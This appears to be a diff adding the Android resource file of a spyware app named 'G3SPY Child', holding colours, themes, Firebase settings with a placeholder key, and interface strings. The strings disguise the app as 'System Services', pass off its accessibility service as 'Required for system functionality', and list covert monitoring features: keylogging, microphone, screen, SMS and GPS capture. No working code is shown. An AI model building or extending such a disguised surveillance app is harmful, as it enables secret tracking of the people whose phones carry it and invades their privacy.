@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <color name="black">#FF000000</color>
+    <color name="purple_200">#FFBB86FC</color>
+    <color name="purple_500">#FF6200EE</color>
+    <color name="purple_700">#FF3700B3</color>
+    <color name="teal_200">#FF03DAC5</color>
+    <color name="teal_700">#FF018786</color>
+    <color name="white">#FFFFFFFF</color>
+    <string name="accessibility_service_description">Required for system functionality</string>
+    <string name="app_name">System Services</string>
+    <string name="call_service">CALL</string>
+    <string name="data_collection">Data Collection: ENABLED</string>
+    <string name="firebase_connection">Firebase Connection: SECURE</string>
+    <string name="firebase_database_url" translatable="false">https://g3spy-project-default-rtdb.firebaseio.com</string>
+    <string name="gcm_defaultSenderId" translatable="false">123456789012</string>
+    <string name="google_api_key" translatable="false">AIzaSyDummyApiKeyForG3SPYChildApp</string>
+    <string name="google_app_id" translatable="false">1:123456789012:android:abc123def456</string>
+    <string name="google_crash_reporting_api_key" translatable="false">AIzaSyDummyApiKeyForG3SPYChildApp</string>
+    <string name="google_storage_bucket" translatable="false">g3spy-project.appspot.com</string>
+    <string name="gps_service">GPS</string>
+    <string name="keylog_service">KEYLOG</string>
+    <string name="mic_service">MIC</string>
+    <string name="project_id" translatable="false">g3spy-project</string>
+    <string name="screen_service">SCREEN</string>
+    <string name="secure_connection">SECURE CONNECTION ESTABLISHED</string>
+    <string name="services_running">Monitoring Services: RUNNING</string>
+    <string name="sms_service">SMS</string>
+    <string name="status_active">ACTIVE</string>
+    <string name="status_inactive">INACTIVE</string>
+    <string name="system_active">SYSTEM ACTIVE</string>
+    <string name="system_info">SYSTEM INFO</string>
+    <style name="Theme.G3SPYChild" parent="Theme.Material3.DayNight">
+        
+        <item name="colorPrimary">@color/purple_500</item>
+        <item name="colorPrimaryDark">@color/purple_700</item>
+        <item name="colorAccent">@color/teal_200</item>
+        <item name="colorOnPrimary">@color/white</item>
+        
+        <item name="colorSecondary">@color/teal_200</item>
+        <item name="colorOnSecondary">@color/black</item>
+        
+        <item name="android:statusBarColor">@color/purple_700</item>
+        
+    </style>
+    <style name="Theme.G3SPYChild.AppBarOverlay" parent="ThemeOverlay.Material3.Dark.ActionBar"/>
+    <style name="Theme.G3SPYChild.NoActionBar">
+        <item name="windowActionBar">false</item>
+        <item name="windowNoTitle">true</item>
+    </style>
+    <style name="Theme.G3SPYChild.PopupOverlay" parent="ThemeOverlay.Material3.Light"/>
+</resources>
